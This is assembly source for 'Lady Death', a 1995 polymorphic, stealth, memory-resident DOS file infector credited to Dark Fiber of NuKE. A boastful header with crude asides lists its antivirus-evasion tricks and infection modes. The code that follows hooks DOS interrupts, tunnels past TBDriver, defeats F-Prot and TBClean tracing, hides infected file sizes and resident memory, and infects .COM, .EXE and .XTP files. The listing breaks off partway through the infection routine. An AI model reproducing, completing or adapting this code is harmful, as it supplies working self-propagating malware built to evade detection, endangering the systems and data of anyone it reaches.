Comment ~

        AAieeee. I'm sick to death of looking at this code any longer!

I could not test this 100%, coz my machine had an incompatibility i think.
and it only shows up when i infect SOME .exe files.  What happens is that
the file is infected properly, its header is updated, so is the memory
requirements, and the stack.  Now, it makes no difference if the virus
is in memory or not, but MSDos will load all the file into memory, except
for the last 512bytes or so, so everything gets decrypted, but because
the heap is at the end, its missing, along with some of the code.....
This is through no fault of mine, because the code is sound, so.....

---------------------------------[ MISC. SHIT ]--------------------------------

                                      ***
                             **  DELTA RELEASE  **
                          **  (C) 1995 DARK FIBER  **
                                      ***

                                      ***
        ** I told a few people it would be finished by a certain date **
             ** Well, NuKE are renowned for their shoddy viruses **
                 ** So I wanted to do some extra bug testing **
                   ** Thats my excuse for its late release **
       ** So I'm hoping to the great binary god its bloody bug free ;) **
         ** Ugh, Ugh, Ugh, after 4 versions it better bloody well be **
                                      ***

------------------------------[ MISC. SHIT ENDS ]------------------------------

           Virus Name : Lady Death (a.k.a the Stainless Steel Armadillo)

                        Chotto Abunai ne?
                        (Translation : "Little bit dangerous hmmm?")

              Version : 0.1 Delta

               Author : Dark Fiber [NuKE]

               Origin : Australia

                Bonus : Comments and ramblings from the author. Free of charge
                        Yes, completley useless rants thrown in for good
                        measure.

                 Type : UMB Resident, Tunneling, Poly, Stealth, .COM .EXE .XTP,
                        MCB stealth (Yeah! finally got it working! ð:)

    Minimum Processor : 80286. Not tested for. Who gives a fuck if some wanky
                        little XT does down.  They will probably think the
                        long wait means its still trying to load! heheheh ;)

              Payload : N.A.  Nada, Zip, Zilch,

Retroish thingy stuff : MSAV VSafe
                        CPAV VSafe
                        McAfee Scan
                        F'ing-Protection
                        Vet
                        InVercible
                        ThunderByteAntiVirus
                        ThunderByteAntiVirus (On Tunneling)
                        ThunderByteClean (TBClean cant clean the infection)
                        AntiVirusPro
                        VDS (Well, it avoided its bait files, etc)
                            (or is that just my stealth? ;)

       Anti-Heurstics : TBscan : On .COM files it fools TBScan into thinking
                                 its a .TXT file, so it just "Looks", .EXE
                                 files have no protection due to IP points
                                 directly at the polycode
                        F-Prot : Uses the standard F-Prot kill technique of a
                                 short jump (PIQ clear).
                                 Shit, just fot 2.19, and the Anti-FP does
                                 not work any more. gotta find some new stuff.
                        AVP : On 2.2 it finds a EXETSR_Type virus or something.

    Poly \ Encryption : Lady Deaths Cosmetic Kit ð;)
                        Polymorph routines will generate a decryption routine
                        somewhere in the range of about 30 bytes to 64 bytes,
                        Will encrypt files with ADD, SUB, XOR, (NOT+NEG rmoved)

                        Lady Death's cosmetic kit,
                        Yes, it changes the face of your virus, takes those
                        unencrypted wrinkles out of your life, Lady Death's
                        cosmetic kit works wonders on memory resident .COM
                        and .EXE infectors, making them look more complex
                        than they really are, we here at [NuKE] will garuntee
                        that your virus will have that "just encrypted" look
                        that every young encrypted virus has, or we'll give
                        you your un-encrypted virus back, free of charge.

                        The polymorphic routines generate a variable length
                        decryptor, so the virus must be padded between the
                        end of the virus and the copy of the original
                        un-altered header to create a constant length I can
                        stealth.

                        After reading the documentation for TBAV [WTF! READ
                        documentaion! shya ;)] I liked the part where it tells
                        of creating a scan string for Malaga or something (one
                        of the encrypted Jerusalem variants) and about how it
                        only used two different CondJump opcodes, wich helped
                        give it away. So after some thinking, I managed to
                        implement 6 different ones, a step up from the standard
                        two ;), so thats 12 diff loops (up+down) in total!

                        The poly is the lamest routine in here, but I was
                        despairing over the size of her.... so had to be
                        cheap and cut back somewhere!

                        I originally had the virus completley polymorphing the
                        WHOLE file (in chunks), this put a major slowdown,
                        because, while avoiding memory scanners, it would
                        decrypt Int21h EVERY SINGLE TIME it was called, now
                        this is the most overused INT ever, its called more
                        times than the bloody clock per second, and it also
                        put an overhead of like 64 bytes of decryption per
                        chunk, so basically it is not really feasible.

                 Size : Poly (Max 64) + Virus Size + Padding + Header (018h)
                        2774 bytes infected

     Scan Stuff Finds : Scan 2.x                : Nothing.
                                                  (Like thats an achievement)
                        F-Prot 2.19 (/Analyse)  : Nothing
                        F-Prot 2.19 (/Paranoid) : Nothing
                        TBAV 6.35               : Flags, flags, flags ;(
                        AVP 2.2                 : Suspicious

             Compiler : A86 v3.72
                         People with enough money and no sense who own copies
                        of TASM or MASM will have to do a re-write, but hey,
                        thats against the laws of copyright ;).
                         People with no money and no sense who own pirated
                        copies of TASM or MASM can just ftp down to there local
                        site and leech a copy of A86.
                         People with a lesser version of A86 can just leech a
                        new version.
                         People who are using CHASM can just fuck off.

         Side Effects : Hmm, well, i used the 6th bit (starting from 0)
                        to mark an infection, as far as i could tell, its the
                        only bit that is not used as Novel use the last bit
                        (7) for some network execution status thingy.
                        The FCB stealth routine, well, because non extended
                        FCB's dont include the attrib field, we can't test for
                        an infection, but how many programs use standard FCB's?
                        It does not check to see how small a file is before
                        infecting it, so it will infect files 0 bytes long.

                Notes : This virus changes its behaviour on the fly
                        depending on what program or function is being
                        run as to what mode it will enter.
                        Programs such as SCAN\PKZip,ARJ, etc will make
                        the virus go into FastInfection mode which will infect
                        any file opened with 3D\6C, while programs like
                        Scandisk, Chkdsk, or NortonDiskDoctor  make the virus
                        turn all its stealthing modes off, etc, etc.
                        Minimum memory required by the program is also
                        adjusted for .EXE files

         Mode Changes : * PKZip, PKZipfix, (PKZ*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - FastInfection on
                        * Arj, Arjm, Arjsort, (ARJ*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - FastInfection on
                        * LHA, LHArc , (LHA*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - FastInfection on
                        * RAR (RAR*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - FastInfection on
                        * Microsoft Backup (MSB*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - FastInfection on
                        * Central Point Backup (CPB*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - FastInfection on
                        * Backup (BAC*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - FastInfection on
                        * Norton Disk Doctor (NDD*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                        * Chkdsk (CHK*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                          - Hide our MCB memory
                        * Scandisk (SCAND*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                        * Speedisk (SPEE*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                        * Defrag (DEF*)
                          - StealthFCB+DTA+Stamp off
                          - StealthRead off
                        * Scan (McAfee) (SC*)
                          - Fast infection on
                        * Vet Anti-Virus (VET*)
                          - Fast infection on
                        * Invercible (IV*)
                          - Infect files off
                        * F-Prot (F-*)
                          - Fast infection on
                        * AVPro + AVPTsr, etc (AV*)
                          - Infect files off
                        * TBav family of programs. (TB*)
                          - Infect files off
                        * List.com (Makes a great infection vector) (LI*)
                          - Fast infection on
                        * T.com (its what i call list.com) (T.*)
                          - Fast infection on
                        * Qemm Manifest (MFT*)
                          - Hide our MCB memory
                        * SI ?? (SI*)
                          - Hide our MCB memory
                        * MI ?? (MI*)
                          - Hide our MCB memory
                        * Sysinfo (Nortons) (SYSI*)
                          - Hide our MCB memory
                        * Mem (MessyDos) (MEM*)
                          - Hide our MCB memory

           Disclaimer : No bytes or stray bits where killed during the making
                        of this virus, however an MCB header was damaged when
                        it failed to get out of the way.

  ReVisionary History : 0.1a    - Concieved with the froth of my loins and my
                                  assembler.
                                  2327? bytes of code (-Poly, -Header)
                        0.1b    - Refined the figure of this pale skinned
                                  beauty (Err, um, I optimised some code)
                                  No changes were made to her costume (err No
                                  bug fixes were implemented.)
                                  And made her black leather outfit a bit
                                  shinnier ;) (Um, made the polymorph better)
                                  2358 bytes of code per infection.
                        0.1c    - Gave her a new hairdo (Um, added MCB stealth)
                                  2423 bytes of code per infection.
                        0.1d    - Added tunneling. Fixed the MCB stealth
                                  bug. blah. blah. Some more minor things.
                                  2774 bytes of code per infection.

~

;-------------------------------[ CODERS READY ]-------------------------------
;-----------------------[ CODERS, START YOUR ASSEMBLER ]-----------------------
;---------------------------------[ ASSEMBLE ]---------------------------------

ORG 0

PolySize        equ     64      ;Max Polysize allowed.
PolyAnd         equ      2      ;Careful if u change this.
                                ;This will drastically alter the size of the
                                ;poly code generated...., and you would also
                                ;have to alter PolySize.... to compensate.

;------------------------------------------------------------------------------

Virus_Start:

Kill_TBScan:
                ;Look ma, no hands!
                ;Well, i'm yet to find an anti-tbscan piece of code
                ;that i like....

;Kill TBAVs "E" relocatable entry point flag
;                db      0b8             ;mov ax,
;                pop     si              ;pop si
;                db      0e9             ;Jump over call
;                dw      3               ;last opcode of mov cx is our jump
;                call    $ - 4           ;Call back to POP SI
;                sub     si,$

;Here we go, on the rollercoaster ride of code.
                mov     ax,02edfh       ;Yooohoooo, Are u in memory?
                int     21h

Kill_F_Prot:
;This routine manages to kill F-Prot, whilst gaining us the IP of our virus.
;The HLT instruction also manages to stop TBClean from cleaning the file!
;
;               hlt                     ;Halt the proc
;               mov     bp,sp
;               mov     si,w[bp-6]      ;Get the IP,
;               sub     si,Kill_F_Prot  ;Sub to get the virus offset
;
;Shit, EMM386, did not like the HLT..... ;(
;Now i gotta find some otherway to kill f-prot, etc.

;This routine stops F-Prot + TBClean from working.
                call    $+3
                inc     sp                      ;This will kill the INT1 tracer
                inc     sp                      ;programs, such as TBClean ;)
                mov     bp,sp                   ;Why? coz, look, read the bit
                mov     si,word ptr [bp-2]      ;on the tunneling code.
                sub     si,Kill_F_Prot+3

                cmp     ax,"Ÿd"                 ;dŸ, after xchg al,ah
                jne     GoResident              ;Yohoho and a bottle of rum.

                jmp     WeAreResident

GoResident:
;A word on the memory allocation might be in order.
;
;First, we check for enuff memory in the UMB for us,
;if there is none or not enough available we will resize our current
;host.  Now, when resizing the current host, it SHOULD NOT resize the host
;if its min+max mem allocation in the .EXE header are the same, the reason
;being, um, oops, stupidly, i do resize.... ;( hmm, gotta fix that.
;

                push    es                      ;Dont loose the psp seg

                mov     di,3                    ;offset into MCB

                mov     ax,05803
                mov     bx,1                    ;Now ReChain, so we know fer
                int     21h                     ;sure they r chained.

                mov     ax,05801
                mov     bx,081                  ;High mem, best fit, then low
                int     21h

                mov     ah,048
                mov     bx,virmem               ;Enuff for us?
                int     021
                jnc     MemIsOK

                mov     ax,es                   ;Nup, so resize the host
                dec     ax                      ;Gimme MCB of host seg
                mov     ds,ax                   ;Set to data

                mov     ax,virmem+1             ;+1 for mcb header
                mov     bx,word ptr [di]
                sub     bx,ax                   ;
                sub     word ptr [di+0f],ax     ;fix psp

                mov     ah,04a                  ;resize minus enuff mem
                int     21h                     ;for us

                mov     ah,048
                mov     bx,virmem               ;Now get our memory
                int     21h
                jc      BadMemory               ;Still none? then exit

MemIsOK:
                dec     ax                      ;Set to MCB para
                mov     es,ax
            es: mov     word ptr [di-2],8          ;Make system data
                inc     ax
                mov     es,ax

                mov     ax,05803                ;Unchain UMBs from memory
                xor     bx,bx
                int     21h

                mov     ax,05801                ;Reset malloc type to
                int     21h                     ;low mem, first fit.

                xor     di,di                   ;set dest offset
                mov     cx,VirLen               ;Copy virus up there
            cs: repnz   movsb                   ;SI already = Delta offset

                push    es
                push    offset Run_Tunnel
                retf
Run_Tunnel:
                call    Tunnel_Int21h           ;Tunnel to get Int21he
                mov     ds,cx                   ;CX == 0
                mov     si,cx

                mov     word ptr [021*4],offset Int21Handler
                mov     word ptr [021*4+2],cs

BadMemory:
                pop     es

WeAreResident:
                push    cs
                pop     ds

                add     si,offset OldHostCode1
                mov     bx,es
                add     bx,16

                lodsw                           ;Get SS
                add     ax,bx
                mov     dx,ax
                lodsw                           ;Get SP
                mov     bp,ax

                lodsw                           ;Get IP
                mov     di,ax
                lodsw                           ;Get CS
                add     ax,bx

                mov     ss,dx
                mov     sp,bp

                push    ax
                xor     ax,ax
                push    di

                db      0eb             ;If exe skip code put back routine
SkipPutBack:    db      0

                movsw                   ;DI=IP,=0100h on .COM
                movsw
                movsw

                push    es
                pop     ds

                mov     bx,ax
                mov     cx,ax
                cwd                     ;hey, its the file pointer trick!
                mov     bp,ax
                mov     si,ax
                mov     di,ax
                retf

;------------------------------------------------------------------------------

;We have a quit prog check so we can re-set our attributes
QuitVector:
                pop     si
            cs: mov     byte ptr [StatusBits],0         ;Clear all status bits
                call    ShowMCB
                Jmp     $Run_Int21

;------------------------------------------------------------------------------
ShowMCB:
                call    Save_Regs
                mov     bx,8                            ;Set MCB to system
                jmp     BlowDryMCB                      ;data program

;------------------------------------------------------------------------------
HideMCB:
                call    Save_Regs
                xor     bx,bx                           ;Set MCB to free

BlowDryMCB:
                push    cs
                pop     ax
                dec     ax
                mov     es,ax
            es: mov     word ptr [1],bx                 ;Set MCB to BX

                push    cs
                pop     ds
                mov     di,8                            ;Point to MCB name
                mov     si,offset buffer+22             ;Copy filename into
                mov     cx,di                           ;the MCB name
                rep     movsb

                call    Restore_Regs
                ret

;------------------------------------------------------------------------------
;
                db "Lady Death : DarkÿFiber [NuKE]"
;
; called it "Lady Death" coz its one of the best comics ever, and if you
; havn't seen it then you don't know what your missing. ð|)
; Well, its not a patch on Ah My Goddess, but it is good.
;
;------------------------------------------------------------------------------

Int21Handler:
;
;Anti-Int1h tunnel code. Same as what TBAV uses, i just changed the reigsters
;
                cli                     ;
                push    si              ;This code will kill programs that
                push    ax              ;try and use Int 1 to trace me.
                xchg    ax,si           ;When an Int1 trace is detected it
                pop     ax              ;will skip the virus Int routine and
                dec     sp              ;run the the top Dos Int21h, not the
                dec     sp              ;one we found when WE tunneld through
                pop     si              ;the code. ;), so they get the int21
                cmp     ax,si           ;of the program that last hooked it
                pop     si              ;before the virus did.  Why did i
                jne     $Run_Int21      ;add this?  Who knows? delete it if u
                                        ;want to.
                cmp     ax,02edfh
                jne     AintNoYohoho

                mov     ax,"Ÿd"         ;dŸ after xchg al,ah
                iret

AintNoYohoho:
                push    si
                pushf
                push    ax

                mov     si,offset Int_Table     ;What functions did we hook?
                cld

ReadFromTable:
            cs: lodsb
                sub     al,ah                   ;Is it the same?
                jnz     NotInIntTable           ;If Not Zero, then its not...

                pop     ax
                popf
            cs: jmp     word ptr [si]           ;Run out procedure

NotInIntTable:
                inc     si,2
            cs: cmp     byte ptr [si],0         ;Check for end of table
                jne     ReadFromTable

                pop     ax
                popf
                pop     si

$Run_Int21:
            cs: Jmp     D[Old21h]               ;Run OLD dos int21h

$Call_Int21:
                pushf
            cs: call    D[Int21h]               ;Run TUNNELED dos Int21h
                ret

;------------------------------------------------------------------------------
;This procedure will stealth reads opon virus inflicted areas

;When a file is read,
; use its handle to get the SFT,
; check in the SFT for the attribute
;   redirect reads from the start and the end of the virus

StealthReadFile:
                pop     si

                push    es,di
                call    HandleToSFT

            cs: test    byte ptr [StatusBits],00100xb
                jne     GoodRead

            es: test    byte ptr [di+4],040             ;Infected file?
                je      GoodRead
            es: cmp     word ptr [di+017],0             ;High size >0000
                jne     GoodRead
            es: cmp     word ptr [di+015],018           ;Low size =>0018
                jb      DoStealthRead

GoodRead:
                pop     di,es
                jmp     $Run_Int21

DoStealthRead:
            es: mov     ax,word ptr [di+015]
            cs: mov     word ptr [StackPointer],ax      ;Temp
                mov     ah,03f
            cs: mov     word ptr [MinMem],dx    ;Temp
            cs: mov     word ptr [MaxMem],ds    ;Temp
            cs: mov     word ptr [StackSeg],cx  ;Temp
                call    $Call_int21             ;read in infected header

                pushf
                call    save_regs

                ;we now have infected portions in the buffer.
                ;now we read in our clean header

                push    es
                pop     ds

                ;Fix the file size
                call    AddSize
                call    SubPointer

                push    cs
                pop     ds

                call    $Call_Int21

            es: pop     word ptr [di+017]               ;Reset the pointer
            es: pop     word ptr [di+015]

                call    SubSize

                mov     cx,word ptr [StackPointer]
                les     di,word ptr [MinMem]
                mov     si,dx
                add     si,cx
                add     di,cx

                neg     cx
                add     cx,018                  ;CX = how much of the buffer
                                                ;MAX we can move
                cmp     cx,word ptr [StackSeg]
                jb      MoveGoodCode            ;Dont move more code in than
                                                ;the amount that was asked for
                mov     cx,word ptr [StackSeg]

MoveGoodCode:
                rep     movsb

                call    restore_regs
                popf

                pop     di,es
                retf    2

;-----------------------------------------------------------------------------
; Some notes about the tunneling routine.
;
; The tunneling routine is designed to tunnel right up to the DOS
; Kernal, unlike some other tunnelers, it does not stop when it
; encounters the
;      NOP
;      NOP
;      CALL xxxx
;  CS: JMP D[xxxx]
;
; Dos POINTER to the kernal.   Its also able to find the kernal whether DOS
; is loaded LOW or HIGH, with EMM386 etc, etc, blah, QEMM, etc, blah, nuff!
;
; It also stops other programs from turning off the TRACE bit in the FLAGS
; register by detecting a POPF and OR'ing the flag bit to on.
;
; Some programs like TBDriver dont tolerate Int1 tracers, but i've added
; code that detected TBDriver, and bypasses it.
;
; The reason why TBdriver can detect Int1 tracers, is because TBDriver
; takes a word out of memory just below the stack pointer, now, if no
; Int1 tracer has been used, then the word is correct, but if Int1 is running
; then the word is overwritten in memory by the  IP, CODE, FLAG of the opcode
; that was single stepped.
;
; Shit, just tried Nemesis, and it dissabled the tracer, ;(, and considering
; that I just spent the last 9 hours draining (exploring melbournes underground
; drain + tunnel system) I cant really be fucked at even trying to get around
; this.
;

Tunnel_Int21h:
                call    save_regs

                push    cs
                pop     ds

                mov     ax,03521                        ;Save Int21h
                int     21h
                mov     word ptr [Int21h+2],es
                mov     word ptr [Int21h],bx
                mov     word ptr [Old21h+2],es
                mov     word ptr [Old21h],bx

                mov     al,01                           ;Save Int 0h
                int     21h
                mov     word ptr [Int24h+2],es
                mov     word ptr [Int24h],bx

                mov     ah,025                          ;Set tunneler Int
                mov     dx,offset int_1Handler
                int     21h

                pushf                                   ;Flags for IRET

                pushf
                pop     ax
                or      ah,01                           ;Turn trace on
                push    ax
                popf

                ;To find the kernal, trace a function thats internal to dos so
                ;that its pretty much garunteed not to be hooked by any other
                ;program in memory.

                mov     ax,03306                        ;Real Dos Version
                call    d[Int21h]                       ;kills BX, DX
                                                        ;Invokes tunnler
                lds     dx,word ptr [Int24h]
                mov     ax,02501                        ;Restore Int 1
                int     21h

Quit_Tunnel:
                call    restore_regs
                ret                                     ;Return

;------------------------------------------------------------------------------

int_1Handler:
                call    save_regs                       ;Save regs

                lds     si,word ptr [bp+22]             ;Get CS:IP
                cld
                lodsb                                   ;Get byte
                xor     bx,bx                           ;clear seg overides

                cmp     al,026                          ;ES:
                jne     NoES
                mov     bl,1
NoES:
                cmp     al,02e                          ;CS:
                jne     NoCS
                mov     bl,2
NoCS:
                cmp     al,036                          ;SS:
                jne     NoSS
                mov     bl,3
NoSS:
                cmp     al,03e                          ;DS:
                jne     NoDS
                mov     bl,4
NoDS:
                or      bx,bx
                je      MakeDS                          ;if seg overide
                lodsb                                   ;get next opcode
MakeDS:
                or      bl,bl
                jne     IsOurCode                       ;If no seg overides
                mov     bl,4                            ;assume DS

IsOurCode:
                ;Left over from some testing ð:)

IsFlagPop:
                cmp     al,09d                          ;POPF
                jne     IsIRET
                or      word ptr [bp+26],0100           ;keep trace mode on
                jmp     RunNextOpCode

IsIRET:
                cmp     al,0cf                          ;IRET
                jne     IsFARJump
                and     word ptr [bp+26],0feff          ;turn trace off
                jmp     RunNextOpCode

IsFARJump:
                cmp     al,0ea                          ;JUMP xxxx:yyyy
                jne     IsJDouble
FARJumpData:
                lodsw
            cs: mov     word ptr [Int21h],ax            ;Save far jump
                lodsw
            cs: mov     word ptr [Int21h+2],ax          ;Save far jump
                jmp     RunNextOpCode

IsJDouble:
                cmp     al,0ff                          ;JMP D[xxxx]
                jne     TBKiller
                cmp     byte ptr [si],01e               ;type 1
                je      ItIsJDouble
                cmp     byte ptr [si],02e               ;type 2
                jne     TBKiller

ItIsJDouble:
                lodsb
                cmp     bl,1
                jne     ItsNotES                        ;If ES
                mov     ax,word ptr [bp+2]              ;get ES segment
ItsNotES:
                cmp     bl,2
                jne     ItsNotCS                        ;If CS
                mov     ax,ds                           ;get CS segment
ItsNotCS:
                cmp     bl,3
                jne     ItsNotSS                        ;If SS
                mov     ax,ss                           ;Get SS segment
ItsNotSS:
                cmp     bl,4
                jne     RunSeg                          ;If DS
                mov     ax,word ptr [bp]                ;Get DS segment
RunSeg:
                mov     ds,ax
                lodsw
                mov     si,ax
                jmp     FARJumpData

TBKiller:
                cmp     al,0fa                          ;CLI
                jne     RunNextOpCode
                lodsw
                cmp     ax,0fc9c                        ;Is it TBDriver?
                jne     RunNextOpCode
                lodsw
                cmp     ax,05053                        ;TBDriver?
                jne     RunNextOpCode
                sub     si,10
                mov     word ptr [bp+22],si             ;Skip TBDriver code ;)
                inc     si                              ;Run the Far Jump
                jmp     FARJumpData

RunNextOpCode:
                call    restore_regs                    ;Restore
                iret                                    ;Run opcode

;-----------------------------------------------------------------------------
SubSize:
            es: sub     word ptr [di+011],VirLenX       ;Sub Virus Size
            es: sbb     word ptr [di+015],0             ;With borrow
                ret

AddSize:
            es: add     word ptr [di+011],VirLenX       ;Add virus size
            es: adc     word ptr [Di+015],0             ;With carry
                ret

SubPointer:
            cs: pop     word ptr [SubPointerReturn]     ;Save POP

                mov     cx,018                          ;Header size

                mov     ax,word ptr [di+011]            ;Set the pointer to
                sub     ax,cx
                xchg    word ptr [di+015],ax            ;FileEnd - Buffer
                push    ax
                mov     ax,word ptr [di+013]            ;Flick N Toggle
                sbb     ax,0
                xchg    word ptr [di+017],ax            ;Wibble N Wobble
                push    ax

                mov     ah,03f
                mov     dx,offset Buffer2               ;Set to read

                db      0eb,0                           ;Clear PIQ

                db 068                                  ;PUSH
SubPointerReturn:
                dw ?
                ret                                     ;return

;------------------------------------------------------------------------------
;We disinfect an OPEN file, with BX = Filehandle, and SI on the stack
;We dont need to save the date and time because who ever is writting
;to the host initiated the write, so we dont need to mask that.

DisinfectFile:
                pop     si
                call    DisinfectFile1
                jmp     $Run_Int21

DisinfectFile1:
                pushf
                call    save_regs

                call    HandleToSFT
                push    es
                pop     ds

                mov     al,byte ptr [di+4]
                test    al,040                          ;Is it infected
                jne     RunDisinfect

                call    restore_regs                    ;Nyup, lets bugger off.
                popf
                ret

RunDisinfect:
                push    es                              ;Shit, it is,
                pop     ds                              ;Okey, lets go to work

                xor     al,040                          ;Clear infection marker
            cs: mov     byte ptr [OldAttrib],al         ;N save it

                mov     byte ptr [di+2],2               ;Set to read and write

                call    AddSize                         ;Fix size
                call    SubPointer                      ;Move pointer to header

                mov     byte ptr [di+4],ch              ;clear all attribs
                push    cs
                pop     ds
                call    $Call_Int21                     ;read in clean header

            es: mov     word ptr [di+015],0             ;Reset the pointer to
            es: mov     word ptr [di+017],0             ;0000:0000

                mov     ah,040                          ;Disinfect the file
                call    $Call_Int21                     ;Now write clean header

                mov     al,byte ptr [OldAttrib]

                push    es
                pop     ds

                mov     byte ptr [di+4],al              ;Reset attributes

                pop     word ptr [di+017]               ;Restore the pointer
                pop     word ptr [di+015]               ;Restore the pointer

                call    SubSize                         ;Remove virus size

                call    restore_regs                    ;Lets getoutta here
                popf
                ret                                     ;Return

;------------------------------------------------------------------------------
;
                db         "Stainless Steel Armadillo"
;
;            Good manga by Ryukihei published by Associated Press.
;
;------------------------------------------------------------------------------
;This procedure stealths our virus marker
;If the attribute is requested to be changed, we check for an infection
; and if so, change the attribute, masking our marker.
;If its ask for, we just siphon off the virus marker.
;
;The reason that we open the file and change the attribs that way is
;because DOS ignores the top bits when you try to set them to on. so
;we gotta do it the long way.

StealthAttrib:
                pop     si

            cs: test    byte ptr [StatusBits],0001xb    ;We not stealthing
                jne     NoStealthAttrib                 ;markers?

                cmp     al,0
                jne     SetAttributes           ;Read?

                call    $Call_Int21
                pushf
                and     cl,0bf                  ;If read, mask marker
                popf
                retf    2

NoStealthAttrib:
                Call    $Call_Int21
                retf    2

SetAttributes:
                mov     ax,04300
                push    cx
                call    $Call_Int21                     ;Gimme attribs
                xchg    cx,ax
                pop     cx
                mov     ax,04301                        ;Set to write
                jc      NoStealthAttrib
                test    al,040                          ;We infected?
                je      NoStealthAttrib                 ;Nope,

                pushf                                   ;Yep,
                call    $Call_Int21                     ;Write it

                call    Save_Regs                       ;Save regs

                mov     ax,03d02
                call    $Call_Int21                     ;Open file

                xchg    bx,ax

                call    HandleToSFT
                or      cl,040
            es: mov     byte ptr [di+4],cl              ;Set attributes

                mov     ah,03e                          ;Close file
                int     021

                call    Restore_Regs
                popf
                retf    2                               ;Return with our flags

;------------------------------------------------------------------------------

;Stealth the size of infected files in Find First\Next
StealthSizeFCB:
                pop     si

                call    $Call_Int21                     ;Run function
                pushf
                call    save_regs

                or      al,al                           ;Did it work?
                jnz     NoStealthDir2

                mov     ah,02f                          ;Yep, so gimme DTA
                call    $Call_Int21

            es: cmp     byte ptr [bx],0ff               ;Test for extended FCB
                jne     NoStealthDir2

                lea     cx,[bx+7+01d]                   ;24 : 1a  cx = size
                add     bx,7+0c                         ;13 : 15  bx = attrib
                jmp     StealthDir

;------------------------------------------------------------------------------
;Here we use Government Coverup techniques to hide the size of the virus
;during DTA functions, similar to the techniques used by Microsoft to
;try and sell windows 95 to us.

StealthSizeDTA:
                pop     si
                call    $Call_Int21             ;run function

                pushf
                call    save_regs
                jc      NoStealthDir2

                mov     ah,02f
                call    $Call_Int21             ;gimme DTA

                lea     cx,[bx+01A]             ;cx = size
                add     bx,015                  ;bx = attrib

StealthDir:
            cs: test    byte ptr [StatusBits],01xb   ;Test for stealth size off
                jne     NoStealthDir2           ;Its on, so no stealth size

                push    es
                pop     ds

                test    byte ptr [bx],040       ;Test for high bit on
                je      NoStealthDir2           ;No, dont stealth date
                and     byte ptr [bx],0BF       ;Strip the bits

                xchg    bx,cx

                sub     word ptr [bx],VirLenX   ;To leave a bare program naked
                sbb     word ptr [bx+2],0       ;in a hostile enviroment.

NoStealthDir2:
                call    restore_regs
                popf
                retf 2

;------------------------------------------------------------------------------
;
;What? no i dont publish Ranma 1/2 lemon fan fiction in rec.arts.anime.stories
;And, no, I dont do Ah My Goddess lemon fan fic either!
;But I never said I didnt write any ;) hehehehehahhahhaa...... er, okey then.
;
;------------------------------------------------------------------------------
;Checks and modifys the bit on extended opens
;This is to help us to stealth the file on future reads.

ExtendedOpen:
                pop     si

;We don't need to check for files that will be created or reset,
;only opened
                test    dl,00010010xb
                jne     StandardOpen

;Set some bits to on, to help us during the future stealth process.
;Turn share to deny none on
;Turn read\write mode on

                and     bx,1011111110001010xb
                or      bx,0000000000000010xb

            cs: test    byte ptr [StatusBits],010000xb
                je      StandardOpen

                push    dx
                mov     dx,si
                call    TryInfection
                pop     dx
                jmp     StandardOpen

;----------------------------------------------------------------------------

;Standard Open infection
InfectVector1:
                pop     si

InfectVector2:
            cs: test    byte ptr [StatusBits],010000xb
                je      StandardOpen

                call    TryInfection

StandardOpen:
                call    $Call_Int21
                call    SetupStealth
                retf    2

;------------------------------------------------------------------------------
SetupStealth:
;Call with handle in AX

                Jc      Ret

                pushf
                call    save_regs

                xchg    bx,ax

                call    HandleToSFT

                push    es
                pop     ds

                test    byte ptr [di+4],040             ;test 4 infection
                je      NoSetStealth

                call    SubSize                         ;if yep, sub virus size

NoSetStealth:
                call    restore_regs
                popf
                ret
;------------------------------------------------------------------------------

;4Bh
InfectVector:
                pop     si

            cs: mov byte ptr [StatusBits],0
                 call    CheckFileName
;This enables me to set the bits for the virus mode operation before
;we do anything drastic.

            cs: test    byte ptr [StatusBits],00010xb   ;MCB Memory Stealth?
                je      $+5
                call    HideMCB

                cmp     al,0                    ;Check for debugger or other
                jne     StealthDebuggerEXEC     ;If so, stealth it

            cs: test    byte ptr [StatusBits],01000xb
                jne     $+5                     ;Check for infect files off
                                                ;Yes, so don't infect
                call    TryInfection
                jmp     $Run_Int21

;------------------------------------------------------------------------------
;
;Ooops, apologies to everyone with a   .com.au  domain.  Looks like I got
;you all banned from #japan again.
;
; df> priss: sumimasen, atama shigoto onegaishimasu
; priss> df: it would be my pleasure.
; eheheheh ;) she is one weird chick! all i did was ask her for the time.....
;
;------------------------------------------------------------------------------

StealthDebuggerEXEC:
;Ick, Disinfect the slimey sheep fucker offov the host.
;Dang debuggers!
                pushf
                call    Save_regs

                mov     ax,03d00                ;Read
                Call    $Call_Int21             ;Will, set it up for
                jc      CantDisinfect
                Call    SetupStealth

                xchg    bx,ax

                Call    VSafe_Toggle            ;Toggle after opening
                Call    GetInt24h

                mov     ax,05700
                int     21h
                push    cx,dx                   ;Save Date+Time

                call    DisinfectFile1

                pop     dx,cx                   ;Restore Date+Time
                mov     ax,05701
                int     21h

                mov     ah,03e                  ;Close
                int     21h

                call    VSafe_Toggle
                call    SetInt24h

CantDisinfect:
                call    Restore_Regs
                popf
                Jmp     $Run_Int21

;-----------------------------------------------------------------------------
;This is the straightforward infection routine.
;DS:DX = filename

TryInfection:
                pushf
                call save_regs

                in      al,021
                or      al,02                   ;Rip me the ints, n mask keyb.
                out     021,al                  ;so it can't be "break"ed.

            cs: mov     word ptr [Filename+0],dx
            cs: mov     word ptr [Filename+2],ds

                call    Vsafe_Toggle
                call    GetInt24h

                mov     si,dx

GetByteName:
                lodsb
                cmp     al,"."
                je      CheckExtension
                or      al,al
                jnz     GetByteName

                jmp     Bad_File1

CheckExtension:
                lodsw
                or      ax,0A0A0h
                cmp     ax,"XE" + 0A0A0h        ;Gimme EXEs
                je      FixAttribs

                cmp     ax,"OC" + 0A0A0h        ;Gimme COMs
                je      FixAttribs

                cmp     ax,"TX" + 0A0A0h        ;Gimme XTPs
                je      FixAttribs

                jmp     Bad_File1

FixAttribs:
                mov     ax,03d00
                call    $Call_Int21                     ;Open the sucker up
                jnc     Check4Infection

                Jmp     Bad_File1

Check4Infection:
                xchg    bx,ax

                call    HandleToSFT

                push    es
